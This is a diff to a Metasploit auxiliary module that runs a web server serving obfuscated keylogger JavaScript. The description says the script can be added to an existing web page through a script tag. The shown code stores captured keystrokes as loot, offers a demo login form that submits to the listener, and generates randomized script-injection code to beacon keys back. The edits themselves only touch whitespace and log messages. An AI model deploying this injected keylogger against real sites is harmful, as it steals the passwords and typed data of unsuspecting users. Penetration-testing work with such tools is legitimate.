@@ -19,7 +19,7 @@ class Metasploit3 < Msf::Auxiliary
 				logging through JavaScript. The DEMO option can be set to enable
 				a page that demonstrates this technique. Future improvements will
 				allow for a configurable template to be used with this module.
-				To use this module with an existing web page, simply add a 
+				To use this module with an existing web page, simply add a
 				script source tag pointing to the URL of this service ending
 				in the .js extension. For example, if URIPATH is set to "test",
 				the following URL will load this script into the calling site:
@@ -42,6 +42,7 @@ class Metasploit3 < Msf::Auxiliary
 		@client_cache = {}
 
 		# Starts Web Server
+		print_status("Listening on #{datastore['SRVHOST']}:#{datastore['SRVPORT']}...")
 		exploit
 	end
 
@@ -62,7 +63,7 @@ class Metasploit3 < Msf::Auxiliary
 
 		unless cid
 			cid = generate_client_id(cli,request)
-			print_status("#{cli.peerhost} Assigning client identifier '#{cid}'")
+			print_status("Assigning client identifier '#{cid}'")
 
 			resp = create_response(302, 'Moved')
 			resp['Content-Type'] = 'text/html'
@@ -177,15 +178,15 @@ class Metasploit3 < Msf::Auxiliary
 				:path_clean => store_loot("browser.keystrokes.clean", "text/plain", cli.peerhost, header, "keystrokes_clean_#{cid}.txt", "Browser Keystroke Logs (Clean)"),
 				:path_raw   => store_loot("browser.keystrokes.raw", "text/plain", cli.peerhost, header, "keystrokes_clean_#{cid}.txt", "Browser Keystroke Logs (Raw)")
 			}
-			print_good("#{cli.peerhost} [#{cid}] Logging clean keystrokes to: #{@client_cache[cid][:path_clean]}")
-			print_good("#{cli.peerhost} [#{cid}] Logging raw keystrokes to: #{@client_cache[cid][:path_raw]}")
+			print_good("[#{cid}] Logging clean keystrokes to: #{@client_cache[cid][:path_clean]}")
+			print_good("[#{cid}] Logging raw keystrokes to: #{@client_cache[cid][:path_raw]}")
 		end
 
 		::File.open( @client_cache[cid][:path_clean], "a") { |fd| fd.puts nice }
 		::File.open( @client_cache[cid][:path_raw], "a")   { |fd| fd.write(real) }
 
 		if nice.length > 0
-			print_good("#{cli.peerhost} [#{cid}] Keys: #{nice}")
+			print_good("[#{cid}] Keys: #{nice}")
 		end
 
 		nice
@@ -206,12 +207,12 @@ class Metasploit3 < Msf::Auxiliary
 </head>
 <body bgcolor="white">
 <br><br>
-<div align="center"> 
+<div align="center">
 <h1>Keylogger Demo Form</h1>
 <form method=\"POST\" name=\"logonf\" action=\"#{base_url}/demo/?id=#{cid}\">
 <p><font color="red"><i>This form submits data to the Metasploit listener for demonstration purposes.</i></font>
 <br><br>
-<table border="0" cellspacing="0" cellpadding="0"> 
+<table border="0" cellspacing="0" cellpadding="0">
 <tr><td>Username:</td> <td><input name="username" size="20"></td> </tr>
 <tr><td>Password:</td> <td><input type="password" name="password" size="20"></td> </tr>
 </table>
@@ -232,7 +233,7 @@ EOS
 	def generate_keylogger_js(base_url, cid)
 
 		targ = Rex::Text.rand_text_alpha(12)
-	
+
 		code = <<EOS
 
 var c#{@seed} = 0;
@@ -267,12 +268,12 @@ function d#{@seed}(e){
 
 function #{@seed}(k#{@seed}){
 	l#{@seed} = l#{@seed} + k#{@seed} + ",";
-		
+
 	var t#{@seed} = "#{targ}" + c#{@seed};
 	c#{@seed}++;
-	
+
 	var f#{@seed};
-	
+
 	if (document.all)
 		f#{@seed} = document.createElement("<script name='" + t#{@seed} + "' id='" + t#{@seed} + "'></script>");
 	else {
